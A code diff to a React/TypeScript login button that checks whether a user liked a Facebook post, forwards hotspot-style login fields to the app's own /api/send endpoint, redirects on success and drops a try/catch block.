@@ -43,15 +43,17 @@ const LoginButton = ({login,continu2,isAuthenticated}:Props) =>{
       const dataFacebook = response.data
       console.log(dataFacebook)
         const validation =  dataFacebook.feed.data[0].likes.data.map((item:any)=>item.name).includes(nameUser)
-        try{
           if(validation){
             console.log('si dio like')
-         await axios.post('/api/send',{username,password,continue_url,login_url});
+          const res = await axios.post('/api/send',{username,password,continue_url,login_url});
           dispatch(uiActions.setLoading(false))
-          const link =document.createElement('a');
-          link.href = 'https://google.com';
-          link.click();
-          console.log("execute code");
+          if(res.status == 200){
+            const link =document.createElement('a');
+            link.href = 'https://google.com';
+            link.click();
+          }else{
+            console.log("algo salio mal ",res.status);
+          }
         }else{
         dispatch(uiActions.setLoading(false))
         const link =document.createElement('a');
@@ -59,10 +61,7 @@ const LoginButton = ({login,continu2,isAuthenticated}:Props) =>{
         link.click();
         console.log('No diste like')
       }
-    }catch(err){
-      console.log('error catched')
-      console.log(err)
-    }
+   
       
     }
     
